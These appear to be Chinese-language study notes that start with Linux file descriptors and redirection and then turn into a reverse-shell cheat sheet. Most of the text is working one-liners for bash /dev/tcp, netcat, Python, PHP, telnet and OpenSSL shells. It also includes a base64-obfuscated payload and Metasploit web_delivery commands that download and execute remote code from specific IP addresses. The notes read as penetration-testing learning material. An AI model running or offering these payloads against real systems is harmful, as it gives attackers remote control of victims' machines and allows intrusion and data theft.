## Linux文件描述符
文件描述符是一个非负整数, 内核需要通过这个文件描述符才可以访问文件, 就像一本书的目录(索引)
- Linux系统中内核默认为每个进程创建三个标准的文件描述符
	- `0` 标准输入  STDIN     默认设备键盘
	- `1` 标准输出  STDOUT  默认设备显示器
	- `2` 标准错误  STDERR  默认设备显示器 (和1指向同一个位置)
- 通过查看`/proc/PID/fd`目录下的文件, 就可以查看每个进程拥有的所有文件描述符
	- 当前shell的文件描述符: `ll /proc/$$/fd` ([[$的用法]])

## 重定向
把输出定向到文件或标准流, 本质即是重定向文件描述符
### 输入重定向
`<` 从文件读取输入

### 输出重定向
`>` 将输出保存到文件(覆盖)
`>>` 将输出追加到文件

### 管道
`|` 将一个程序的输出作为输入发哦是那个到另一个程序

## Linux文件描述符操作
### 更改标准输出位置
```shell
# 把标准输出位置更改到test文件中
exec 1> test

# 把当前标准输出重定向到test文件中
echo 'list' 1> test
cat test
```

### 更改标准输入位置
```shell
# 从键盘输入, 把输入读到user变量
read user
echo $user

# 把test文件中的内容重定向到标准输入
read user 0< test
echo $user

# 标准错误输出
exec 2> test
```

### 创建文件描述符
- 创建 `exec 文件描述符 < 文件名`  或  `exec 文件描述符 > 文件名`
- 调用 `&文件描述符`
- 关闭 `exec 文件描述符<&-`  或   `exec 文件描述符>&-`

### /dev/null
特殊文件, 写入的任何东西都会被清空
- 把STDERR重定向到`/dev/null`, 自动删除错误信息
	- `whoami 2> /dev/null`
- 快速移除文件中的数据而不用删除文件
	- `cat /dev/null > test`

## Bash反弹Shell原理
*被控端*主动向*控制端*发起连接请求, 通常被控端由于防火墙限制, 权限不足, 端口被占用等问题, 导致被控端不能正常接收发送过来的数据包
```shell
# 控制端
nc -lvvp 7777

# 被控端
bash -i >& /dev/tcp/192.168.1.10/7777 0>&1
```
- `bash -i` 打开一个交互式的bash shell.   [[Linux中Shell的几种类型|What is shell?]]
- `/dev/tcp/IP/PORT` /dev/tcp是Linux中的一个特殊设备文件(一切解文件), 实际不存在, bash用来实现网络请求的接口, 打开即发起一个socket连接, 读写即在这个socket连接中传输数据

### 通过socket连接通信
- 向`/dev/tcp/IP/PORT`写入内容
```shell
nc -lvvp 6666
echo hello > /dev/tcp/192.168.1.101/6666
```
- 从`/dev/tcp/IP/PORT`读取内容
```shell
nc -lvvp 6666
cat < /dev/tcp/192.168.1.111/6666
```

### 交互式shell
实现控制端和被控端的交互![[Pasted image 20230810005003.png]]![[Pasted image 20230810005019.png]]
### 把被控端的交互shell输出重定向到控制端 
```shell
bash -i > /dev/tcp/192.168.1.101/6666

#获取bash进程ID
ps -elf|grep "bash -i"
# 查看进程文件描述符
ll /proc/2609/fd
```

### 把控制端的输入重定向到被控端的交互式shell
由目标传递的数据作为交互式shell的输入, 命令执行后的结果输出到目标
```shell
bash -i > /dev/tcp/192.168.1.101/6666 0>&1
```

### Bash反弹Shell
```shell
bash -i &> /dev/tcp/192.168.1.101/6666 0>&1
# 等于
bash -i > /dev/tcp/192.168.1.101/6666 0>&1 2>&1
```
`>&`, `&>` 混合输出, 即将标准输出, 错误输出全都重定向到一个位置
`0>&1` 将标准输入的读取对象设置为标准输出的输出对象, 即将标准输入也重定向到目标位置

## 生成攻击payload
[https://github.com/0dayCTF/reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)
https://github.com/t3l3machus/hoaxshell
## Linux反弹Shell使用方法
### NC (netcat)
- 正向shell: 被控端使用nc将/bin/sh绑定到本地6666端口, 控制端主控连接6666
```shell
# 被控端
nc -lvvp 6666 -e /bin/sh
# 控制端
nc <被控端IP> 6666
```
- 反向shell: 被控端使用nc将/bin/sh发送到控制端的6666端口, 控制端监听本地6666端口
```shell
# 被控端
nc -e /bin/sh <控制端IP> 6666
# 控制端
nc -lvvp 6666
```
- 无-e参数反弹shell: mkfifo命令创建一个管道, cat输出给/bin/sh执行, 通过nc传回该管道
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.101 6666 > /tmp/f
# 或
mknod backpipe p; nc 192.168.1.101 6666 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```
Linux mkfifo: https://www.cnblogs.com/old-path-white-cloud/p/11685558.html
Linux mknod: https://man.linuxde.net/mknod
- 正向或反向, 分别需要不同的IP信息(控制端或被控端)
- 参数:
	- `-e` 指定一个文件名, 连接后执行, 有些nc没有\[!dangerous\]
	- `-l` 监听模式
	- `-v` 显示详细信息, `-vv` 更加详细
	- `-n` 禁止`名称/端口`形式的DNS解析, 只使用IP
	- `-p` 指定端口, 位置在最后

### Bash
```shell
# 被控端:
exec 5<>/dev/tcp/139.155.49.43/6666;cat <&5 | while read line; do $line 2>&5 >&5; done

# 控制端:
nc –lvvp 6666

# base64编码绕过: 
bash -i >& /dev/tcp/47.101.214.85/6666 0>&1
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMjE0Ljg1LzY2NjYgMD4mMQ==|base64 -d|bash -i"
```
```shell
msfvenom -p cmd/unix/reverse_bash lhost=10.10.1.11 lport=6666 -f raw

bash -c '0<&200-;exec 200<>/dev/tcp/192.168.3.32/6666;sh <&200 >&200 2>&200'
```
![[腾讯课堂20230811213414.png]]

### Python
```shell
# 一行命令反弹shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.101.214.85",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- Msfvenom的python反弹shell的payload
```
msfvenom -p python/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=6666 -f raw
handler -p python/meterpreter/reverse_tcp -H 139.155.49.43 -P 6666
```
- Web delivery反弹shell
```shell
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 0
msf5 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set lport 8888
msf5 exploit(multi/script/web_delivery) > exploit –j
#
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://139.155.49.43:8080/pWMAajktf', context=ssl._create_unverified_context());exec(r.read());"
```

### PHP
- 一行命令反弹shell
```shell
php -r '$sock=fsockopen("47.101.214.85",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Msfvenom生成
```shell
msfvenom -p php/bind_php lport=6666 -f raw > bind_php.php
```
- Web_delivery
```shell
use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 1
msf5 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > exploit –j
#
php -d allow_url_fopen=true -r "eval(file_get_contents('http://139.155.49.43:8080/RRfKpX', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```

### Telnet
```shell
# 攻击机
nc -lvvp 5555
nc -lvvp 6666

# 目标机
telnet 192.168.1.101 5555 | /bin/bash | telnet 192.168.1.101 6666
```
```shell
# 攻击机
nc -lvvp 6666
# 目标机
rm -f a && mknod a p && telnet 192.168.1.101 6666 0<a | /bin/bash 1>a
rm -f a;mknod a p;telnet 192.168.1.101 6666 0<a | /bin/bash 1>a
```

### OpenSSL
反弹443端口, 加密流量传输
1. 在远程攻击主机上生成密钥文件
`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`
2. 在远程攻击主机上启动监视器
`openssl s_server -quiet -key key.pem -cert cert.pem -port 443`
3. 在目标机上反弹shell
`mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s`

https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998
